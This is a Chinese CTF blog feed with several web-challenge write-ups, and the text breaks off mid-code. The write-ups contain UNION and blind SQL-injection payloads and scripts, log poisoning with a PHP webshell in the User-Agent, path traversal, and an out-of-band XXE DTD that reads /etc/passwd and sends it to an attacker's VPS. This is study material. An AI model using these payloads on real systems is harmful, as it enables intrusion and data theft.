base64_encode(serialize($a));</span><br><span class="line"><span class="keyword">echo</span> $api;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#Tzo1OiJhZG1pbiI6NTp7czo0OiJuYW1lIjtzOjU6ImFkbWluIjtzOjU6ImNoZWNrIjtzOjMyOiI2MTIyYzA0ZThhMWYzNTI5ZDU1NjE5OTk2MGVmMjU1NiI7czo0OiJkYXRhIjtzOjQ4OiKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAiO3M6NjoibWV0aG9kIjtzOjg6ImRlbF91c2VyIjtzOjY6InVzZXJpZCI7czoxOiIyIjt9</span></span><br></pre></td></tr></table></figure><p>这里要删除的用户通过查看登录用户cookie解密之后得到的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(@$login==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">@mysql_conn();</span><br><span class="line">$sql = <span class="string">"select * from user where name='$username'"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($sql));</span><br><span class="line">mysql_close();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($result))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'passwd'</span>] == md5($password))</span><br><span class="line">&#123;</span><br><span class="line">$user_cookie = <span class="string">''</span>;</span><br><span class="line">$user_cookie .= $result[<span class="string">'userid'</span>];</span><br><span class="line">$user_cookie .= $result[<span class="string">'name'</span>];</span><br><span class="line">$user_cookie .= $result[<span class="string">'salt'</span>];</span><br><span class="line">$cookies = base64_encode($user_cookie);</span><br><span class="line"><span class="comment">//$cookies = $user_cookie;</span></span><br><span class="line">setcookie(<span class="string">"user"</span>,$cookies,time()+<span class="number">60</span>,<span class="string">'/web/'</span>);</span><br><span class="line">$_SESSION[<span class="string">'login'</span>] = <span class="number">1</span>;</span><br><span class="line">$_SESSION[<span class="string">'user'</span>] = $username;</span><br><span class="line">header(<span class="string">'Location:/web/riji.php'</span>);</span><br></pre></td></tr></table></figure><p>最后就是传参，再开个窗口或者换个浏览器</p><img src="/2020/08/04/SWPUCTF2016-Web-blogsys/2.png" class=""><p>这时候会发现之前登录的账号还保持登录的状态，直接查flag(字段值逐个猜测，为3)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()<span class="comment">#flag,msg,user</span></span><br><span class="line">?id=-1%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x666c6167<span class="comment">#flag</span></span><br><span class="line">?id=-1%20union%20select%201,2,flag%20from%20flag</span><br></pre></td></tr></table></figure><img src="/2020/08/04/SWPUCTF2016-Web-blogsys/3.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;知识点&quot;&gt;&lt;a href=&quot;#知识点&quot; class=&quot;headerlink&quot; title=&quot;知识点&quot;&gt;&lt;/a&gt;知识点
    
    </summary>
    
    
    
      <category term="SWPU" scheme="http://yoursite.com/tags/SWPU/"/>
    
  </entry>
  
  <entry>
    <title>36D-web-ak-challenge</title>
    <link href="http://yoursite.com/2020/07/31/36D-web-ak-challenge/"/>
    <id>http://yoursite.com/2020/07/31/36D-web-ak-challenge/</id>
    <published>2020-07-31T14:17:40.000Z</published>
    <updated>2020-08-03T02:29:20.000Z</updated>
    
    <content type="html"><![CDATA[<p>昨天就看了签到题比较匆忙，没猜着文件名就没做了，今天好好复现<a id="more"></a></p><h2 id="签到-观己"><a href="#签到-观己" class="headerlink" title="签到_观己"></a>签到_观己</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>nginx日志文件路径</li><li>UA字段插入一句话木马</li></ul><h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>开题给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/php/i'</span>, $file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'error'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>开始以为考点在preg_match()函数的绕过，尝试了数组和换行符进行绕过php过滤，先入为主了，以为过滤了php后缀flag文件就是flag.php，没有考虑到flag.txt,还在那尝试了半天的路径穿越</p><p>知道了文件名直接猜测在根目录下面</p><img src="/2020/07/31/36D-web-ak-challenge/1.png" class=""><p>正解应该不是这样做的，先看一下nginx的日志文件<code>?file=/var/log/nginx/access.log</code></p><img src="/2020/07/31/36D-web-ak-challenge/2.png" class=""><p>看到了包含UA字段，尝试能不能在UA字段插入一句话🐎，抓包添加一下放包</p><img src="/2020/07/31/36D-web-ak-challenge/3.png" class=""><p>可以看到根目录下的flag.txt文件，再读取</p><p>还有一种解法使用伪协议data://，但是这题行不通，allow_url_include是off(附上伪协议文章，很详细<a href="https://blog.csdn.net/nzjdsds/article/details/82461043" target="_blank" rel="noopener">https://blog.csdn.net/nzjdsds/article/details/82461043</a>)</p><h2 id="web1-观字"><a href="#web1-观字" class="headerlink" title="web1_观字"></a>web1_观字</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul><li>curl命令</li><li>curl命令。能够替换.</li></ul><h3 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>开题送源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#flag in http://192.168.7.68/flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">    $protocol = substr($url, <span class="number">0</span>,<span class="number">7</span>);</span><br><span class="line">    <span class="keyword">if</span>($protocol!=<span class="string">'http://'</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'仅限http协议访问'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/\.|\;|\||\&lt;|\&gt;|\*|\%|\^|\(|\)|\#|\@|\!|\`|\~|\+|\'|\"|\.|\,|\?|\[|\]|\&#123;|\&#125;|\!|\&amp;|\$|0/'</span>, $url))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'仅限域名地址访问'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">'curl '</span>.$url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接给了flag的位置，问题是怎么绕过过滤让curl执行读取文件信息</p><p>这里进制转换不行，过滤了0，转换为十进制为3232237380</p><p>这里就要用到上面那的知识点用(。)替代(.)</p><img src="/2020/07/31/36D-web-ak-challenge/4.png" class=""><h2 id="web2-观星"><a href="#web2-观星" class="headerlink" title="web2_观星"></a>web2_观星</h2><h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><ul><li>substr()逗号被过滤时用from x1 for x2替代</li><li>if替代，case when then else end</li></ul><h3 id="解题步骤-2"><a href="#解题步骤-2" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>开题，能选择三个链接，跟id有关，首先想到的是SQL注入</p><p>测试一下，发现空格、逗号、ascii、like、=等被过滤了</p><p><code>substr(database() from 1 for 1 )代替substr(database(),1,1)</code></p><p><code>case when代替if</code></p><p><code>ord代替ascii</code></p><p><code>regexp代替like、=</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://ac6a84ba-b399-4b05-8a0d-a103b394dfc9.chall.ctf.show/index.php?id=1^"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        payload1 = <span class="string">"case(ord(substr(database()from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end"</span>.format(i,j)<span class="comment">#web1</span></span><br><span class="line">        payload2 = <span class="string">"case(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)regexp(database()))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end"</span>.format(i,j)<span class="comment">#flag,page,user</span></span><br><span class="line">        payload3 = <span class="string">"case(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)regexp(0x666c6167))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end"</span>.format(i,j)<span class="comment">#FLAG_COLUMN,flag</span></span><br><span class="line">        payload4 = <span class="string">"case(ord(substr((select(group_concat(flag))from(flag))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end"</span>.format(i,j)</span><br><span class="line">        <span class="comment"># print(payload1)</span></span><br><span class="line">        <span class="comment"># print(url+payload3)</span></span><br><span class="line">        r = requests.get(url+payload4)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"I asked nothing"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>本来想用二分法，但是这题好像不太合适，常规方法速度也挺快的，就用常规的盲注方法好了</p><h2 id="web3-观图"><a href="#web3-观图" class="headerlink" title="web3_观图"></a>web3_观图</h2><h3 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h3><ul><li>openssl_decrypt函数加密</li><li>rand()函数最大值</li><li>暴力破解</li></ul><h3 id="解题步骤-3"><a href="#解题步骤-3" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>开题是一张GIF图片，查看源码发现提示</p><img src="/2020/07/31/36D-web-ak-challenge/5.png" class=""><p>直接访问showImage.php，拿到了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//$key = substr(md5('ctfshow'.rand()),3,8);</span></span><br><span class="line"><span class="comment">//flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'image'</span>]))&#123;</span><br><span class="line">    $image=$_GET[<span class="string">'image'</span>];</span><br><span class="line">    $str = openssl_decrypt($image, <span class="string">'bf-ecb'</span>, $key);</span><br><span class="line">    <span class="keyword">if</span>(file_exists($str))&#123;</span><br><span class="line">        header(<span class="string">'content-type:image/gif'</span>);</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents($str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>从源码中就可以看出要爆破出key的值，查一下opessl_decrypt函数的用法，尝试爆破</p><p>源码中只要我们能够得到解密后的文件名并且存在，就能够包含该文件</p><p>先来看一下rand()函数的最大值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span>(getrandmax());</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="number">32767</span></span><br></pre></td></tr></table></figure><p>下面就碰撞出key的值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">32768</span>;$i++)&#123;</span><br><span class="line">    $key = substr(md5(<span class="string">'ctfshow'</span>.$i),<span class="number">3</span>,<span class="number">8</span>);</span><br><span class="line">    $image=<span class="string">"Z6Ilu83MIDw="</span>;</span><br><span class="line">    $str = openssl_decrypt($image, <span class="string">'bf-ecb'</span>, $key);</span><br><span class="line">    <span class="keyword">if</span>(strpos($str,<span class="string">"gif"</span>) <span class="keyword">or</span> strpos($str,<span class="string">"jpg"</span>) <span class="keyword">or</span> strpos($str,<span class="string">"png"</span>))&#123;</span><br><span class="line">        <span class="keyword">print</span>($str.<span class="string">" "</span>);</span><br><span class="line">        <span class="keyword">print</span>($i);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">327671.</span>jpg <span class="number">27347</span></span><br></pre></td></tr></table></figure><p>文件格式不外乎gif\png\jpg</p><p>只要解密后能够匹配到就算成功了</p><p>得到$i的值为27347</p><p>下面就是解密了，由于浏览器会进行一次url解码，这里要进行一下编码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$rand=<span class="number">27347</span>;</span><br><span class="line">$key = substr(md5(<span class="string">'ctfshow'</span>.$rand),<span class="number">3</span>,<span class="number">8</span>);</span><br><span class="line">$image=<span class="string">"config.php"</span>;</span><br><span class="line">$str = openssl_encrypt($image, <span class="string">'bf-ecb'</span>, $key);</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode($str);</span><br><span class="line"><span class="number">27347</span>N6bf8Bd8jm0SpmTZGl0isw==&lt;br /&gt;N6bf8Bd8jm0SpmTZGl0isw%<span class="number">3</span>D%<span class="number">3</span>D</span><br></pre></td></tr></table></figure><p>访问</p><img src="/2020/07/31/36D-web-ak-challenge/6.png" class=""><p>一张打不开的图片，下载下来保存，notepad++打开即可</p><img src="/2020/07/31/36D-web-ak-challenge/7.png" class=""><h2 id="web4-观心"><a href="#web4-观心" class="headerlink" title="web4_观心"></a>web4_观心</h2><h3 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h3><ul><li>xxe的DTD实体</li></ul><h3 id="解题步骤-4"><a href="#解题步骤-4" class="headerlink" title="解题步骤"></a>解题步骤</h3><img src="/2020/07/31/36D-web-ak-challenge/8.png" class=""><p>占卜时可以看到向api.php，POST传参api和city</p><p>可以看到文件格式是xml</p><p>应该是Blind_OOB_XXE ，这里有篇文章<a href="https://blog.csdn.net/weixin_39194641/article/details/102251374" target="_blank" rel="noopener">https://blog.csdn.net/weixin_39194641/article/details/102251374</a></p><p>在自己的vps上起一个xml和dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://ip/test.dtd"</span>&gt;</span> </span></span><br><span class="line"><span class="meta">%remote;%int;%send; ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span><span class="tag">&lt;<span class="name">login</span>&gt;</span>bee<span class="tag">&lt;/<span class="name">login</span>&gt;</span><span class="tag">&lt;<span class="name">secret</span>&gt;</span>Any bugs?<span class="tag">&lt;/<span class="name">secret</span>&gt;</span><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % p1 SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % p2 &quot;&lt;!ENTITY xxe SYSTEM &#39;ip&#x2F;pass&#x3D;%p1;&#39;&gt;&quot;&gt;</span><br><span class="line">%p2;</span><br></pre></td></tr></table></figure><p>post传参访问自己的vps网页就行</p><img src="/2020/07/31/36D-web-ak-challenge/9.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;昨天就看了签到题比较匆忙，没猜着文件名就没做了，今天好好复现
    
    </summary>
    
    
    
      <category term="show" scheme="http://yoursite.com/tags/show/"/>
    
  </entry>
  
  <entry>
    <title>DSAJuly</title>
    <link href="http://yoursite.com/2020/07/31/DSAJuly/"/>
    <id>http://yoursite.com/2020/07/31/DSAJuly/</id>
    <published>2020-07-31T02:16:05.000Z</published>
    <updated>2020-07-31T02:42:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>安恒月赛，就做出了一个WEB，赛后复现，学习SQL无列名注入，以及等价替换的数据库<a id="more"></a></p><h2 id="SQLI"><a href="#SQLI" class="headerlink" title="SQLI"></a>SQLI</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>bypassinfomation_schema(sys.schema_table_statistics_with_buffer/sys.x$schema_table_statistics_with_buffer/mysql.innodb_table_stats)</li><li>sys.schema_tables_with_full_table_scans</li><li>无列名注入</li></ul><h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>打开题目要传入id</p><p>尝试联合查询，返回了WAF</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">"/;|benchmark|\^|if|[\s]|in|case|when|sleep|auto|desc|stat|\||lock|or|and|&amp;|like|-|`/i"</span>, $id);</span><br></pre></td></tr></table></figure><p>看到被过滤的关键词，information_schema不能用了，然后当时想到了能替换的库，但是不知道怎么找</p><p>这里stat被过滤说明下面的库也都不能用了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(sys.schema_table_statistics_with_buffer&#x2F;sys.x$schema_table_statistics_with_buffer&#x2F;mysql.innodb_table_stats)</span><br></pre></td></tr></table></figure><p>赛后看wp还有一个库sys.schema_tables_with_full_table_scans</p><p>查一下表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=0'<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">group_concat</span>(object_name),<span class="number">3</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sys.schema_tables_with_full_table_scans%<span class="number">23</span></span><br><span class="line"><span class="comment">#users,flllaaaggg,sys_config</span></span><br></pre></td></tr></table></figure><img src="/2020/07/31/DSAJuly/1.png" class=""><p>下面就是要进行无列名注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0'<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span><span class="comment">/**/</span>a<span class="number">.2</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>*<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flllaaaggg)a<span class="comment">/**/</span><span class="keyword">limit</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">1</span>),<span class="number">3</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure><img src="/2020/07/31/DSAJuly/2.png" class=""><h2 id="Ezfileincude"><a href="#Ezfileincude" class="headerlink" title="Ezfileincude"></a>Ezfileincude</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul><li>Unix时间戳</li><li>文件包含</li><li>目录穿越</li></ul><h3 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>开题得到一张图片</p><img src="/2020/07/31/DSAJuly/3.png" class=""><p>查看源代码，发现可以点击的地址</p><img src="/2020/07/31/DSAJuly/4.png" class=""><p>可以发现有两个参数，一个是时间戳一个是base64加密后的文件名，解码一下是gpa.png</p><p>刷新一下会发现提示：what’s your time?</p><p>说明时间要保持最新，直接目录穿越</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure><p>然后base64加密一下传给f，t要更新到最新</p><img src="/2020/07/31/DSAJuly/5.png" class=""><p>当然也可以用半自动化脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">t = int(time.time())</span><br><span class="line">f = <span class="string">'gqy.jpg?../../../../../../flag'</span></span><br><span class="line">f = base64.b64encode(f.encode()).decode()</span><br><span class="line">print(t, f)</span><br><span class="line">host = <span class="string">'http://183.129.189.60:10009/image.php?t=&#123;&#125;&amp;f=&#123;&#125;'</span>.format(t, f)</span><br><span class="line">head = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0)'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url=host, headers=head)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>顺利拿到flag</p><img src="/2020/07/31/DSAJuly/6.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;安恒月赛，就做出了一个WEB，赛后复现，学习SQL无列名注入，以及等价替换的数据库
    
    </summary>
    
    
    
      <category term="DAS" scheme="http://yoursite.com/tags/DAS/"/>
    
  </entry>
  
  <entry>
    <title>NCTF2019-phar-matches-everything</title>
    <link href="http://yoursite.com/2020/07/30/NCTF2019-phar-matches-everything/"/>
    <id>http://yoursite.com/2020/07/30/NCTF2019-phar-matches-everything/</id>
    <published>2020-07-30T08:41:50.000Z</published>
    <updated>2020-07-30T10:15:14.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点<a id="more"></a></h2><ul><li>vim的swp恢复文件</li><li>phar反序列化</li><li>protected属性与public属性序列化区别</li><li>生成攻击PHP-FPM的TCP数据流的脚本</li><li>gopher打PHP-FPM</li></ul><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>打开题目，能够上传文件，题目就是phar，那肯定与phar反序列化有关</p><p>扫描目录，没有发现什么隐藏文件，看了wp说是用.swp恢复，但是试的时候没恢复出来，直接GitHub拿下了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easytest</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $test;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">funny_get</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $url;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">        $ch = curl_init();  </span><br><span class="line">        curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">        curl_setopt($ch,CURLOPT_RETURNTRANSFER,<span class="keyword">true</span>);</span><br><span class="line">        $output=curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $this_is_a_easy_test=unserialize($_GET[<span class="string">'careful'</span>]);</span><br><span class="line">        <span class="keyword">if</span>($this_is_a_easy_test-&gt;funny_get() === <span class="string">'1'</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;curl(<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>])) &#123;</span><br><span class="line">    $check = getimagesize($_POST[<span class="string">'name'</span>]);</span><br><span class="line">    <span class="keyword">if</span>($check !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is an image - "</span> . $check[<span class="string">"mime"</span>] . <span class="string">"."</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> 